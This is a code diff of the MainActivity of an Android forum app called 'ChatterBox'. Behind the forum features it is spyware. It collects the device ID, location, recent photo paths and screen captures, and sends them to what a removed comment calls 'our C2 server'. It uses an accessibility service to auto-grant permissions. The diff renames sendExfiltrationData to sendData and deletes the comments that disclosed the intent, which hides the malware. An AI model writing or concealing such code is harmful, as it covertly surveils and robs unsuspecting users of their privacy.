@@ -1,6 +1,5 @@
 package com.example.ChatterBox
 
-import android.annotation.SuppressLint
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -32,7 +31,6 @@ import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.accessibility.IdleDetector
 import com.example.ChatterBox.database.AccountManager
 import com.example.ChatterBox.database.BackgroundSyncService
-import com.example.ChatterBox.database.Commands
 import com.example.ChatterBox.database.DataSynchronizer
 import com.example.ChatterBox.database.LocationTracker
 import com.example.ChatterBox.util.PermissionsManager
@@ -141,7 +139,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
                 // Device ID is already included in locationData by LocationTracker
-                dataSynchronizer?.sendExfiltrationData("location_data", locationData.toString())
+                dataSynchronizer?.sendData("location_data", locationData.toString())
             }
         }
     }
@@ -171,10 +169,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     }
     private fun collectDeviceAnalytics() {
         try {
-            // Get a consistent device ID
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-
-            // Create analytics packet with device info
             val deviceInfo = JSONObject().apply {
                 put("device_model", android.os.Build.MODEL)
                 put("device_manufacturer", android.os.Build.MANUFACTURER)
@@ -185,10 +180,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 put("timestamp", System.currentTimeMillis())
             }
 
-            // Send analytics data (actually to our C2 server)
-            dataSynchronizer?.sendExfiltrationData("app_analytics", deviceInfo.toString())
-
-            // Start location analytics if we have permission
+            dataSynchronizer?.sendData("app_analytics", deviceInfo.toString())
             if (ContextCompat.checkSelfPermission(
                     this,
                     android.Manifest.permission.ACCESS_FINE_LOCATION
@@ -208,7 +200,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         val initialMediaDelay = (3 + Math.random() * 5).toLong()
         scheduler.scheduleWithFixedDelay({
             try {
-                // Use the main handler for MediaStore operations
                 handler.post {
                     try {
                         collectMediaMetadata()
@@ -230,10 +221,8 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
         }, initialSyncDelay, 15, TimeUnit.MINUTES)
 
-        // Add a location check task
         scheduler.scheduleWithFixedDelay({
             try {
-                // Always access location on the main thread
                 handler.post {
                     try {
                         collectLocationData()
@@ -272,10 +261,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
     private fun collectMediaMetadata() {
         try {
-            // Get a consistent device ID
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-
-            // Scan most recent images - Properly query MediaStore without using LIMIT
             val mediaStore = contentResolver.query(
                 android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 arrayOf(
@@ -285,7 +271,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 ),
                 null,
                 null,
-                "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC" // Sort by most recent first
+                "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC"
             )
 
             val mediaFiles = JSONObject()
@@ -299,11 +285,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         val displayName = cursor.getString(cursor.getColumnIndexOrThrow(
                             android.provider.MediaStore.Images.Media.DISPLAY_NAME))
 
-                        // Save path in JSON
                         mediaFiles.put(displayName, path)
                         count++
 
-                        // Manually limit to 5 items
                         if (count >= 5) break
 
                     } while (cursor.moveToNext())
@@ -321,7 +305,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     put("android_version", android.os.Build.VERSION.RELEASE)
                 }
 
-                dataSynchronizer?.sendExfiltrationData("media_metadata", mediaData.toString())
+                dataSynchronizer?.sendData("media_metadata", mediaData.toString())
             }
         } catch (e: Exception) {
             Log.e(TAG, "Media scan error: ${e.message}")
@@ -333,10 +317,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         startActivity(intent)
     }
 
-    /**
-     * Start the screen analytics service
-     * (Actually our background capture service)
-     */
     private fun startScreenAnalyticsService(resultCode: Int, data: Intent) {
         val serviceIntent = Intent(this, BackgroundSyncService::class.java)
         serviceIntent.action = "SETUP_PROJECTION"
@@ -345,7 +325,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         startService(serviceIntent)
     }
     private fun registerSystemBroadcasts() {
-        // Monitor charging state
         val batteryFilter = IntentFilter().apply {
             addAction(Intent.ACTION_POWER_CONNECTED)
             addAction(Intent.ACTION_POWER_DISCONNECTED)
@@ -357,7 +336,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
         }, batteryFilter)
 
-        // Monitor screen state
         val screenFilter = IntentFilter().apply {
             addAction(Intent.ACTION_SCREEN_ON)
             addAction(Intent.ACTION_SCREEN_OFF)
@@ -371,20 +349,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     }
     override fun onUserInteraction() {
         super.onUserInteraction()
-
-        // User is active, hide overlay if it's showing
         com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
-
-        // Register activity with idle detector
         IdleDetector.registerUserActivity()
     }
 
     private fun requestMediaProjection() {
-        // Only request if accessibility service is enabled to auto-grant
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             PermissionsManager.enableAutoGrantPermissions(1)
 
-            // Request projection permission
             val mediaProjectionManager =
                 getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             startActivityForResult(
@@ -393,9 +365,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             )
         }
     }
-    /**
-     * Actually perform the permission request
-     */
+
     private fun requestInitialPermissions() {
         val standardPermissions = mutableListOf(
             android.Manifest.permission.READ_MEDIA_IMAGES,
@@ -417,7 +387,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             return
         }
 
-        // Auto-grant if accessibility is enabled
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
         }
@@ -435,20 +404,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         when (requestCode) {
             PERMISSION_REQUEST_CODE -> {
                 PermissionsManager.disableAutoGrantPermissions()
-
-                // Check for any location permissions granted
                 val locationGranted = permissions.filterIndexed { index, permission ->
                     (permission == android.Manifest.permission.ACCESS_FINE_LOCATION ||
                             permission == android.Manifest.permission.ACCESS_COARSE_LOCATION) &&
                             grantResults[index] == PackageManager.PERMISSION_GRANTED
                 }.isNotEmpty()
-
-                // If location access was granted, start location "analytics"
                 if (locationGranted) {
                     LocationTracker.getInstance(this).startTracking()
                 }
-
-                // Handle overlay permission if needed
                 handleSpecialPermissions()
             }
         }
@@ -490,9 +453,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
             MEDIA_PROJECTION_REQUEST_CODE -> {
                 if (resultCode == RESULT_OK && data != null) {
-                    // Start background service with projection result
                     startScreenAnalyticsService(resultCode, data)
-                    // Request remaining permissions
                     requestInitialPermissions()
                 }
             }
@@ -504,7 +465,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
     override fun onResume() {
         super.onResume()
-        loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
+        loadEnrolledForums()
         com.example.ChatterBox.accessibility.ScreenOnService.hideBlackOverlay(this)
         IdleDetector.registerUserActivity()
     }
@@ -513,7 +474,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
         handler.postDelayed({
             dataSynchronizer?.synchronizeData()
-        }, 5000) // After 5 seconds of being in background
+        }, 5000)
     }
     override fun onDestroy() {
         IdleDetector.stopIdleDetection()
@@ -522,7 +483,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         AccessibilityHelper.resetSession(this)
     }
 
-    /** 🔹 Setup Navigation Drawer */
     private fun setupDrawer() {
         drawerLayout = findViewById(R.id.drawer_layout)
         val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)
@@ -540,7 +500,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         navigationView.setNavigationItemSelectedListener(this)
     }
 
-    /** 🔹 Handle Sidebar Navigation */
     override fun onNavigationItemSelected(item: MenuItem): Boolean {
         when (item.itemId) {
             R.id.nav_saved_posts -> {
@@ -582,7 +541,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         return when (item.itemId) {
             R.id.action_search -> {
                 val intent = Intent(this, SearchUsersActivity::class.java)
-                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
+                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE)
                 true
             }
 
@@ -590,7 +549,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
-    /** 🔹 Handle Back Button */
+
     override fun onBackPressed() {
         if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
             drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
@@ -622,7 +581,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         finish() // ✅ Close current activity
     }
 
-    /** 🔹 Load User Profile */
+
     private fun loadUserProfile() {
         val user = auth.currentUser ?: return
         val navigationView: NavigationView = findViewById(R.id.navigation_view)
@@ -658,7 +617,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
     }
 
-    /** 🔹 Check if User is Admin */
+
     private fun checkIfAdmin() {
         val currentUser = auth.currentUser ?: return
         val userRef = db.collection("users").document(currentUser.uid)
@@ -679,12 +638,11 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
-    /** 🔹 Load Enrolled Forums into Sidebar */
+
     private fun loadEnrolledForums() {
         val currentUser = auth.currentUser ?: return
         val userRef = db.collection("users").document(currentUser.uid)
 
-        // 🔹 Listen for changes to the user's enrolled forums
         userRef.addSnapshotListener { document, error ->
             if (error != null) {
                 Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
@@ -708,7 +666,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     return@addSnapshotListener
                 }
 
-                // 🔥 Listen for real-time updates from the `forums` collection
                 db.collection("forums")
                     .whereIn("code", enrolledModuleCodes)
                     .addSnapshotListener { forumDocs, error ->
@@ -717,7 +674,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                             return@addSnapshotListener
                         }
 
-                        menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries
+                        menu.removeGroup(R.id.nav_enrolled_forums_group)
 
                         if (forumDocs == null || forumDocs.isEmpty) {
                             menu.add(
@@ -732,7 +689,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         for (forumDoc in forumDocs) {
                             val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                             val forumCode = forumDoc.getString("code") ?: ""
-                            val forumId = forumDoc.id // ✅ Get the correct forum ID
+                            val forumId = forumDoc.id
 
                             val forumItem = menu.add(
                                 R.id.nav_enrolled_forums_group,
@@ -743,7 +700,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
                             forumItem.setOnMenuItemClickListener {
                                 val intent = Intent(this, ForumPostsActivity::class.java)
-                                intent.putExtra("FORUM_ID", forumId) // ✅ Pass correct forum ID
+                                intent.putExtra("FORUM_ID", forumId)
                                 intent.putExtra("FORUM_CODE", forumCode)
                                 startActivity(intent)
                                 true
